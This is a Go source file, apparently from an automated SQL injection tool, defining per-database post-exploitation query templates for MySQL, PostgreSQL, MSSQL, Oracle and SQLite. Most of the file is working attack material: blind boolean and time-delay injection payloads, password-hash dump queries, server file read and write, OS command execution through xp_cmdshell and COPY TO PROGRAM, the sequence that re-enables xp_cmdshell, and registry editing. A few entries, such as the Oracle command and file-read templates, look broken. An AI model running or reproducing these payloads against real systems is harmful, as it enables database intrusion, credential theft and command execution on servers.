package dbms

import (
	"fmt"
	"strings"
)

// Queries holds the post-detection database manipulation SQL for one DBMS.
// Every string is a *template* with the {e} macro substituted by the caller
// when a query must be nested inside another expression. Functions that take
// arguments build the fully-qualified SQL fragment directly.
type Queries struct {
	Name string

	// Single-value probes (return one row / one scalar).
	CurrentUser func() string
	CurrentDB   func() string
	Hostname    func() string
	Version     func() string
	IsDBA       func() string

	// List queries returning multiple rows of one column.
	ListUsers     func() string
	ListDatabases func() string

	// Table / column / row enumeration.
	ListTables func(db string) string
	ListCols   func(db, table string) string
	CountRows  func(db, table string) string

	// Data dump building blocks.
	SelectRows  func(db, table string, cols []string, where string, limit, offset int64) string
	LimitClause func(limit, offset int64) string

	// Credential extraction.
	PasswordHashes func() string

	// Privilege / role listing.
	ListPrivileges func() string

	// Filesystem.
	ReadFile  func(path string) string
	WriteFile func(content, path string) string
	OSCommand func(cmd string) string
	OSEnable  func() string // command that enables OS exec when initially blocked
	OSEnabled func() string // returns a string to detect whether OS exec works

	// Registry (MSSQL only).
	RegRead     func(hive, path, key string) string
	RegWrite    func(hive, path, key, value string) string
	RegDelete   func(hive, path, key string) string
	RegEnumKeys func(hive, path string) string

	// Extraction adapter: describes HOW to build conditions over an expression
	// for blind / union extraction.
	Extract Extract

	// StackedOK reports whether statement stacking works (drives OS exec).
	StackedOK bool

	// Override identifies how identifiers are quoted.
	QuoteIdent func(name string) string
}

// Extract describes how to splice a boolean/time predicate around an arbitrary
// expression and how to read back a scalar value through each technique.
type Extract struct {
	// CharAt returns an SQL expression yielding the ASCII code (INT) of the
	// character at 1-based position pos of the given expression e. Only the
	// printable/byte case is needed; the blind engine compares it to probes.
	CharAt func(e string, pos int) string
	// Length returns an SQL expression yielding the LENGTH (in characters) of
	// the given expression e.
	Length func(e string) string
	// MaxLen caps the number of characters scanned for a single value before
	// giving up (protects against runaway length detection).
	MaxLen int

	// BoolTrue / BoolFalse are the oracle expressions used to calibrate the
	// boolean technique's true / false signatures for a given original value.
	BoolTrue  func(orig string) string
	BoolFalse func(orig string) string
	// BoolTest wraps a condition string so that it evaluates, standalone, as
	// true or false inside the injected boolean context.
	BoolTest func(orig, cond string) string

	// TimeCond wraps a condition; when true it triggers a sleep. delay is in
	// seconds. TimeTest is the full injected value.
	TimeTest func(orig, cond, delay string) string

	// UnionSelectCol, given a scalar expression, returns the column used in a
	// UNION select that reflects the value. cols is a comma list already built.
	// For direct (union/error) extraction we produce the value as a string.
	UnionValue func(e string) string
	// Direct read for error/stacked: returns the query text used to obtain the
	// scalar value in a way the response will reveal (used by OS/file where a
	// result is required). For blind engines this is unused.
	Direct func(e string) string
}

// postRegistry holds per-DBMS post-detection queries.
var postRegistry = map[string]*Queries{}

func registerPost(q *Queries) {
	if q != nil && q.Name != "" {
		postRegistry[q.Name] = q
	}
}

// Post returns the post-detection query set for a normalized DB name.
func Post(name string) *Queries {
	return postRegistry[NormalizeName(name)]
}

// Quote default identifier quoting: no special quoting.
func stdQuote(name string) string { return name }

func backtickQuote(name string) string {
	return "`" + strings.ReplaceAll(name, "`", "``") + "`"
}

func doubleQuote(name string) string {
	return `"` + strings.ReplaceAll(name, `"`, `""`) + `"`
}

func bracketQuote(name string) string {
	return "[" + strings.ReplaceAll(name, "]", "]]") + "]"
}

func init() {
	registerPost(mysqlPost())
	registerPost(postgresPost())
	registerPost(mssqlPost())
	registerPost(oraclePost())
	registerPost(sqlitePost())
	registerPost(genericPost())
}

func mysqlPost() *Queries {
	quoteIdent := backtickQuote
	return &Queries{
		Name: MySQL,
		CurrentUser: func() string {
			return "SELECT user()"
		},
		CurrentDB: func() string {
			return "SELECT database()"
		},
		Hostname: func() string {
			return "SELECT @@hostname"
		},
		Version: func() string {
			return "SELECT version()"
		},
		IsDBA: func() string {
			return "SELECT super_priv FROM mysql.user WHERE user=user()"
		},
		ListUsers: func() string {
			return "SELECT user FROM mysql.user"
		},
		ListDatabases: func() string {
			return "SELECT schema_name FROM information_schema.schemata"
		},
		ListTables: func(db string) string {
			return "SELECT table_name FROM information_schema.tables WHERE table_schema='" + db + "'"
		},
		ListCols: func(db, table string) string {
			return "SELECT column_name FROM information_schema.columns WHERE table_schema='" + db + "' AND table_name='" + table + "'"
		},
		CountRows: func(db, table string) string {
			return "SELECT count(*) FROM " + quoteIdent(db) + "." + quoteIdent(table)
		},
		SelectRows: func(db, table string, cols []string, where string, limit, offset int64) string {
			var sb strings.Builder
			sb.WriteString("SELECT ")
			sb.WriteString(joinCols(cols, func(c string) string { return quoteIdent(c) }))
			sb.WriteString(" FROM " + quoteIdent(db) + "." + quoteIdent(table))
			if strings.TrimSpace(where) != "" {
				sb.WriteString(" WHERE " + where)
			}
			if limit > 0 {
				sb.WriteString(fmt.Sprintf(" LIMIT %d", limit))
			}
			if offset > 0 {
				sb.WriteString(fmt.Sprintf(" OFFSET %d", offset))
			}
			return sb.String()
		},
		LimitClause: func(limit, offset int64) string {
			var sb strings.Builder
			if limit > 0 {
				sb.WriteString(fmt.Sprintf(" LIMIT %d", limit))
			}
			if offset > 0 {
				sb.WriteString(fmt.Sprintf(" OFFSET %d", offset))
			}
			return sb.String()
		},
		PasswordHashes: func() string {
			return "SELECT user,authentication_string FROM mysql.user"
		},
		ListPrivileges: func() string {
			return "SELECT GRANTEE,PRIVILEGE_TYPE FROM information_schema.USER_PRIVILEGES"
		},
		ReadFile: func(path string) string {
			return "SELECT load_file('" + path + "')"
		},
		WriteFile: func(content, path string) string {
			return "SELECT '" + escapeSQ(content) + "' INTO OUTFILE '" + path + "'"
		},
		OSCommand: func(cmd string) string {
			return "SELECT sys_eval('" + cmd + "')"
		},
		OSEnable: func() string {
			return ""
		},
		OSEnabled: func() string {
			return "SELECT @@version"
		},
		RegRead:     nil,
		RegWrite:    nil,
		RegDelete:   nil,
		RegEnumKeys: nil,
		Extract: Extract{
			CharAt: func(e string, pos int) string {
				return "ascii(substring((" + e + ")," + itoa(int64(pos)) + ",1))"
			},
			Length: func(e string) string {
				return "length((" + e + "))"
			},
			MaxLen: 128,
			BoolTrue: func(orig string) string {
				return orig + " AND 1=1-- -"
			},
			BoolFalse: func(orig string) string {
				return orig + " AND 1=2-- -"
			},
			BoolTest: func(orig, cond string) string {
				return orig + " AND (" + cond + ")-- -"
			},
			TimeTest: func(orig, cond, delay string) string {
				return orig + " AND IF((" + cond + "),SLEEP(" + delay + "),0)-- -"
			},
			UnionValue: func(e string) string {
				return "(" + e + ")"
			},
			Direct: func(e string) string {
				return "SELECT " + "(" + e + ")"
			},
		},
		StackedOK:  true,
		QuoteIdent: quoteIdent,
	}
}

func postgresPost() *Queries {
	quoteIdent := doubleQuote
	return &Queries{
		Name: Postgres,
		CurrentUser: func() string {
			return "SELECT current_user"
		},
		CurrentDB: func() string {
			return "SELECT current_database()"
		},
		Hostname: func() string {
			return "SELECT inet_server_addr()"
		},
		Version: func() string {
			return "SELECT version()"
		},
		IsDBA: func() string {
			return "SELECT usesuper FROM pg_user WHERE usename=current_user"
		},
		ListUsers: func() string {
			return "SELECT usename FROM pg_user"
		},
		ListDatabases: func() string {
			return "SELECT datname FROM pg_database"
		},
		ListTables: func(db string) string {
			return "SELECT tablename FROM pg_tables WHERE schemaname='" + db + "'"
		},
		ListCols: func(db, table string) string {
			return "SELECT column_name FROM information_schema.columns WHERE table_schema='" + db + "' AND table_name='" + table + "'"
		},
		CountRows: func(db, table string) string {
			return "SELECT count(*) FROM " + quoteIdent(db) + "." + quoteIdent(table)
		},
		SelectRows: func(db, table string, cols []string, where string, limit, offset int64) string {
			var sb strings.Builder
			sb.WriteString("SELECT ")
			sb.WriteString(joinCols(cols, func(c string) string { return quoteIdent(c) }))
			sb.WriteString(" FROM " + quoteIdent(db) + "." + quoteIdent(table))
			if strings.TrimSpace(where) != "" {
				sb.WriteString(" WHERE " + where)
			}
			if limit > 0 {
				sb.WriteString(fmt.Sprintf(" LIMIT %d", limit))
			}
			if offset > 0 {
				sb.WriteString(fmt.Sprintf(" OFFSET %d", offset))
			}
			return sb.String()
		},
		LimitClause: func(limit, offset int64) string {
			var sb strings.Builder
			if limit > 0 {
				sb.WriteString(fmt.Sprintf(" LIMIT %d", limit))
			}
			if offset > 0 {
				sb.WriteString(fmt.Sprintf(" OFFSET %d", offset))
			}
			return sb.String()
		},
		PasswordHashes: func() string {
			return "SELECT usename,passwd FROM pg_shadow"
		},
		ListPrivileges: func() string {
			return "SELECT grantee,privilege_type FROM information_schema.role_table_grants"
		},
		ReadFile: func(path string) string {
			return "SELECT pg_read_file('" + path + "')"
		},
		WriteFile: func(content, path string) string {
			return "COPY (SELECT '" + escapeSQ(content) + "') TO '" + path + "'"
		},
		OSCommand: func(cmd string) string {
			return "COPY (SELECT '') TO PROGRAM '" + cmd + "'"
		},
		OSEnable: func() string {
			return "CREATE FUNCTION pg_temp.system(cmd text) RETURNS text AS 'COPY (SELECT '''') TO PROGRAM '''||cmd||''''; SELECT '''' FROM pg_settings;' LANGUAGE SQL"
		},
		OSEnabled: func() string {
			return "SELECT current_setting('server_version')"
		},
		RegRead:     nil,
		RegWrite:    nil,
		RegDelete:   nil,
		RegEnumKeys: nil,
		Extract: Extract{
			CharAt: func(e string, pos int) string {
				return "ascii(substr((" + e + ")::text," + itoa(int64(pos)) + ",1))"
			},
			Length: func(e string) string {
				return "char_length((" + e + ")::text)"
			},
			MaxLen: 128,
			BoolTrue: func(orig string) string {
				return orig + " AND 1=1"
			},
			BoolFalse: func(orig string) string {
				return orig + " AND 1=2"
			},
			BoolTest: func(orig, cond string) string {
				return orig + " AND (" + cond + ")"
			},
			TimeTest: func(orig, cond, delay string) string {
				return orig + " AND (SELECT CASE WHEN (" + cond + ") THEN pg_sleep(" + delay + ") ELSE 1 END)"
			},
			UnionValue: func(e string) string {
				return "(" + e + ")::text"
			},
			Direct: func(e string) string {
				return "SELECT (" + e + ")::text"
			},
		},
		StackedOK:  true,
		QuoteIdent: quoteIdent,
	}
}

func mssqlPost() *Queries {
	quoteIdent := bracketQuote
	return &Queries{
		Name: MSSQL,
		CurrentUser: func() string {
			return "SELECT system_user"
		},
		CurrentDB: func() string {
			return "SELECT db_name()"
		},
		Hostname: func() string {
			return "SELECT @@servername"
		},
		Version: func() string {
			return "SELECT @@version"
		},
		IsDBA: func() string {
			return "SELECT is_srvrolemember('sysadmin')"
		},
		ListUsers: func() string {
			return "SELECT name FROM sys.sql_logins"
		},
		ListDatabases: func() string {
			return "SELECT name FROM master.dbo.sysdatabases"
		},
		ListTables: func(db string) string {
			return "SELECT name FROM " + db + ".dbo.sysobjects WHERE xtype='U'"
		},
		ListCols: func(db, table string) string {
			return "SELECT name FROM syscolumns WHERE id=OBJECT_ID('" + db + "." + table + "')"
		},
		CountRows: func(db, table string) string {
			return "SELECT count(*) FROM " + db + ".dbo." + table
		},
		SelectRows: func(db, table string, cols []string, where string, limit, offset int64) string {
			var sb strings.Builder
			colList := joinCols(cols, func(c string) string { return quoteIdent(c) })
			tableRef := db + ".dbo." + table
			if limit > 0 {
				// OFFSET requires an ORDER BY in MSSQL; use a stable explicit
				// ORDER BY on the first quoted column.
				orderBy := quoteIdent(cols[0])
				sb.WriteString("SELECT " + colList + " FROM " + tableRef)
				if strings.TrimSpace(where) != "" {
					sb.WriteString(" WHERE " + where)
				}
				sb.WriteString(" ORDER BY " + orderBy + " OFFSET " + itoa(offset) + " ROWS FETCH NEXT " + itoa(limit) + " ROWS ONLY")
			} else if offset > 0 {
				orderBy := quoteIdent(cols[0])
				sb.WriteString("SELECT " + colList + " FROM " + tableRef)
				if strings.TrimSpace(where) != "" {
					sb.WriteString(" WHERE " + where)
				}
				sb.WriteString(" ORDER BY " + orderBy + " OFFSET " + itoa(offset) + " ROWS")
			} else {
				sb.WriteString("SELECT " + colList + " FROM " + tableRef)
				if strings.TrimSpace(where) != "" {
					sb.WriteString(" WHERE " + where)
				}
			}
			return sb.String()
		},
		LimitClause: func(limit, offset int64) string {
			return ""
		},
		PasswordHashes: func() string {
			return "SELECT name,password_hash FROM sys.sql_logins"
		},
		ListPrivileges: func() string {
			return "SELECT CONCAT(grantee_principal_id,'=',class_desc) FROM sys.database_permissions"
		},
		ReadFile: func(path string) string {
			return "SELECT bulk_column FROM OPENROWSET(BULK '" + path + "',SINGLE_CLOB) AS x(bulk_column)"
		},
		WriteFile: func(content, path string) string {
			return ""
		},
		OSCommand: func(cmd string) string {
			return "EXEC xp_cmdshell '" + cmd + "'"
		},
		OSEnable: func() string {
			return "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE"
		},
		OSEnabled: func() string {
			return "SELECT @@version"
		},
		RegRead: func(hive, path, key string) string {
			return "EXEC master..xp_regread '" + hive + "','" + path + "','" + key + "'"
		},
		RegWrite: func(hive, path, key, value string) string {
			return "EXEC master..xp_regwrite '" + hive + "','" + path + "','" + key + "',REG_SZ,'" + value + "'"
		},
		RegDelete: func(hive, path, key string) string {
			return "EXEC master..xp_regdeletevalue '" + hive + "','" + path + "','" + key + "'"
		},
		RegEnumKeys: func(hive, path string) string {
			return "EXEC master..xp_regenumkeys '" + hive + "','" + path + "'"
		},
		Extract: Extract{
			CharAt: func(e string, pos int) string {
				return "ascii(substring(convert(varchar(max),(" + e + "))," + itoa(int64(pos)) + ",1))"
			},
			Length: func(e string) string {
				return "len(convert(varchar(max),(" + e + ")))"
			},
			MaxLen: 128,
			BoolTrue: func(orig string) string {
				return orig + " AND 1=1"
			},
			BoolFalse: func(orig string) string {
				return orig + " AND 1=2"
			},
			BoolTest: func(orig, cond string) string {
				return orig + " AND (" + cond + ")"
			},
			TimeTest: func(orig, cond, delay string) string {
				return orig + ";IF (" + cond + ") WAITFOR DELAY '0:0:" + delay + "'-- -"
			},
			UnionValue: func(e string) string {
				return "convert(varchar(max),(" + e + "))"
			},
			Direct: func(e string) string {
				return "SELECT convert(varchar(max),(" + e + "))"
			},
		},
		StackedOK:  true,
		QuoteIdent: quoteIdent,
	}
}

func oraclePost() *Queries {
	quoteIdent := doubleQuote
	return &Queries{
		Name: Oracle,
		CurrentUser: func() string {
			return "SELECT user FROM dual"
		},
		CurrentDB: func() string {
			return "SELECT global_name FROM global_name"
		},
		Hostname: func() string {
			return "SELECT SYS_CONTEXT('USERENV','HOST') FROM dual"
		},
		Version: func() string {
			return "SELECT banner FROM v$version WHERE rownum=1"
		},
		IsDBA: func() string {
			return "SELECT granted_role FROM user_role_privs WHERE granted_role='DBA'"
		},
		ListUsers: func() string {
			return "SELECT username FROM all_users"
		},
		ListDatabases: func() string {
			return "SELECT global_name FROM global_name"
		},
		ListTables: func(db string) string {
			return "SELECT table_name FROM all_tables WHERE owner='" + db + "'"
		},
		ListCols: func(db, table string) string {
			return "SELECT column_name FROM all_tab_columns WHERE owner='" + db + "' AND table_name='" + table + "'"
		},
		CountRows: func(db, table string) string {
			return "SELECT count(*) FROM " + db + "." + table
		},
		SelectRows: func(db, table string, cols []string, where string, limit, offset int64) string {
			colList := joinCols(cols, func(c string) string { return quoteIdent(c) })
			tableRef := db + "." + table
			var inner strings.Builder
			inner.WriteString("SELECT " + colList + " FROM " + tableRef)
			if strings.TrimSpace(where) != "" {
				inner.WriteString(" WHERE " + where)
			}
			if limit > 0 {
				var sb strings.Builder
				sb.WriteString("SELECT * FROM (")
				sb.WriteString(inner.String())
				sb.WriteString(") WHERE rownum <= " + itoa(offset+limit))
				return sb.String()
			}
			return inner.String()
		},
		LimitClause: func(limit, offset int64) string {
			return ""
		},
		PasswordHashes: func() string {
			return "SELECT name,password FROM sys.user$"
		},
		ListPrivileges: func() string {
			return "SELECT privilege FROM session_privs"
		},
		ReadFile: func(path string) string {
			return "SELECT utl_file.fopen('" + path + "',NULL,'R') FROM dual"
		},
		WriteFile: func(content, path string) string {
			return ""
		},
		OSCommand: func(cmd string) string {
			return "SELECT SYS.DBMS_SCHEDULER.CREATE_JOB('x','JOB_TYPE'=>'EXECUTABLE') FROM dual"
		},
		OSEnable:    func() string { return "" },
		OSEnabled:   func() string { return "SELECT 1 FROM dual" },
		RegRead:     nil,
		RegWrite:    nil,
		RegDelete:   nil,
		RegEnumKeys: nil,
		Extract: Extract{
			CharAt: func(e string, pos int) string {
				return "ascii(substr((" + e + ")," + itoa(int64(pos)) + ",1))"
			},
			Length: func(e string) string {
				return "length((" + e + "))"
			},
			MaxLen: 128,
			BoolTrue: func(orig string) string {
				return orig + " AND 1=1"
			},
			BoolFalse: func(orig string) string {
				return orig + " AND 1=2"
			},
			BoolTest: func(orig, cond string) string {
				return orig + " AND (" + cond + ")"
			},
			TimeTest: func(orig, cond, delay string) string {
				return orig + " AND (SELECT CASE WHEN (" + cond + ") THEN DBMS_PIPE.RECEIVE_MESSAGE('a'," + delay + ") ELSE 0 END FROM dual) IS NOT NULL"
			},
			UnionValue: func(e string) string {
				return "(SELECT " + e + " FROM dual)"
			},
			Direct: func(e string) string {
				return "SELECT " + e + " FROM dual"
			},
		},
		StackedOK:  true,
		QuoteIdent: quoteIdent,
	}
}

func sqlitePost() *Queries {
	quoteIdent := doubleQuote
	return &Queries{
		Name: SQLite,
		CurrentUser: func() string {
			return "SELECT 'n/a'"
		},
		CurrentDB: func() string {
			return "SELECT 'main'"
		},
		Hostname: func() string {
			return "SELECT 'n/a'"
		},
		Version: func() string {
			return "SELECT sqlite_version()"
		},
		IsDBA: func() string {
			return "SELECT 1"
		},
		ListUsers: func() string {
			return "SELECT 'sqlite has no users'"
		},
		ListDatabases: func() string {
			return "SELECT name FROM sqlite_master WHERE type='table'"
		},
		ListTables: func(db string) string {
			return "SELECT name FROM sqlite_master WHERE type='table'"
		},
		ListCols: func(db, table string) string {
			return "SELECT name FROM pragma_table_info('" + table + "')"
		},
		CountRows: func(db, table string) string {
			return "SELECT count(*) FROM " + quoteIdent(table)
		},
		SelectRows: func(db, table string, cols []string, where string, limit, offset int64) string {
			var sb strings.Builder
			sb.WriteString("SELECT ")
			sb.WriteString(joinCols(cols, func(c string) string { return quoteIdent(c) }))
			sb.WriteString(" FROM " + quoteIdent(table))
			if strings.TrimSpace(where) != "" {
				sb.WriteString(" WHERE " + where)
			}
			if limit > 0 {
				sb.WriteString(fmt.Sprintf(" LIMIT %d", limit))
			}
			if offset > 0 {
				sb.WriteString(fmt.Sprintf(" OFFSET %d", offset))
			}
			return sb.String()
		},
		LimitClause: func(limit, offset int64) string {
			var sb strings.Builder
			if limit > 0 {
				sb.WriteString(fmt.Sprintf(" LIMIT %d", limit))
			}
			if offset > 0 {
				sb.WriteString(fmt.Sprintf(" OFFSET %d", offset))
			}
			return sb.String()
		},
		PasswordHashes: func() string {
			return "SELECT 'sqlite has no password hashes'"
		},
		ListPrivileges: func() string {
			return "SELECT 'sqlite has no privileges'"
		},
		ReadFile: func(path string) string {
			return "SELECT readfile('" + path + "')"
		},
		WriteFile: func(content, path string) string {
			return "SELECT writefile('" + path + "','" + escapeSQ(content) + "')"
		},
		OSCommand: func(cmd string) string {
			return "SELECT 'not supported'"
		},
		OSEnable:    func() string { return "" },
		OSEnabled:   func() string { return "SELECT 1" },
		RegRead:     nil,
		RegWrite:    nil,
		RegDelete:   nil,
		RegEnumKeys: nil,
		Extract: Extract{
			CharAt: func(e string, pos int) string {
				return "unicode(substr((" + e + ")," + itoa(int64(pos)) + ",1))"
			},
			Length: func(e string) string {
				return "length((" + e + "))"
			},
			MaxLen: 128,
			BoolTrue: func(orig string) string {
				return orig + " AND 1=1"
			},
			BoolFalse: func(orig string) string {
				return orig + " AND 1=2"
			},
			BoolTest: func(orig, cond string) string {
				return orig + " AND (" + cond + ")"
			},
			TimeTest: func(orig, cond, delay string) string {
				// SQLite has no native sleep; approximate via heavy computation.
				return orig + " AND (SELECT CASE WHEN (" + cond + ") THEN (SELECT count(*) FROM (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<10000000) SELECT x FROM c)) ELSE 0 END)"
			},
			UnionValue: func(e string) string {
				return "(" + e + ")"
			},
			Direct: func(e string) string {
				return "SELECT (" + e + ")"
			},
		},
		StackedOK:  false,
		QuoteIdent: quoteIdent,
	}
}

func genericPost() *Queries {
	quoteIdent := backtickQuote
	return &Queries{
		Name: Generic,
		CurrentUser: func() string {
			return "SELECT 'unknown'"
		},
		CurrentDB: func() string {
			return "SELECT 'unknown'"
		},
		Hostname: func() string {
			return "SELECT 'unknown'"
		},
		Version: func() string {
			return "SELECT 'unknown'"
		},
		IsDBA: func() string {
			return "SELECT 0"
		},
		ListUsers: func() string {
			return "SELECT 'unknown'"
		},
		ListDatabases: func() string {
			return "SELECT 'unknown'"
		},
		ListTables: func(db string) string {
			return "SELECT 'unknown'"
		},
		ListCols: func(db, table string) string {
			return "SELECT 'unknown'"
		},
		CountRows: func(db, table string) string {
			return "SELECT count(*) FROM " + table
		},
		SelectRows: func(db, table string, cols []string, where string, limit, offset int64) string {
			return "SELECT * FROM " + table
		},
		LimitClause: func(limit, offset int64) string {
			return ""
		},
		PasswordHashes: func() string {
			return "SELECT 'unknown'"
		},
		ListPrivileges: func() string {
			return "SELECT 'unknown'"
		},
		ReadFile:    func(path string) string { return "SELECT 'unsupported'" },
		WriteFile:   func(content, path string) string { return "SELECT 'unsupported'" },
		OSCommand:   func(cmd string) string { return "SELECT 'unsupported'" },
		OSEnable:    func() string { return "" },
		OSEnabled:   func() string { return "SELECT 1" },
		RegRead:     nil,
		RegWrite:    nil,
		RegDelete:   nil,
		RegEnumKeys: nil,
		Extract: Extract{
			CharAt: func(e string, pos int) string {
				return "ascii(substr((" + e + ")," + itoa(int64(pos)) + ",1))"
			},
			Length: func(e string) string {
				return "length((" + e + "))"
			},
			MaxLen: 128,
			BoolTrue: func(orig string) string {
				return orig + " AND 1=1"
			},
			BoolFalse: func(orig string) string {
				return orig + " AND 1=2"
			},
			BoolTest: func(orig, cond string) string {
				return orig + " AND (" + cond + ")"
			},
			TimeTest: func(orig, cond, delay string) string {
				return orig + " AND (" + cond + ")"
			},
			UnionValue: func(e string) string {
				return "(" + e + ")"
			},
			Direct: func(e string) string {
				return "SELECT (" + e + ")"
			},
		},
		StackedOK:  false,
		QuoteIdent: quoteIdent,
	}
}

func joinCols(cols []string, q func(string) string) string {
	if len(cols) == 0 {
		return "*"
	}
	quoted := make([]string, len(cols))
	for i, c := range cols {
		quoted[i] = q(c)
	}
	return strings.Join(quoted, ",")
}

func escapeSQ(s string) string {
	return strings.ReplaceAll(s, "'", "''")
}

func itoa(n int64) string {
	return fmt.Sprintf("%d", n)
}
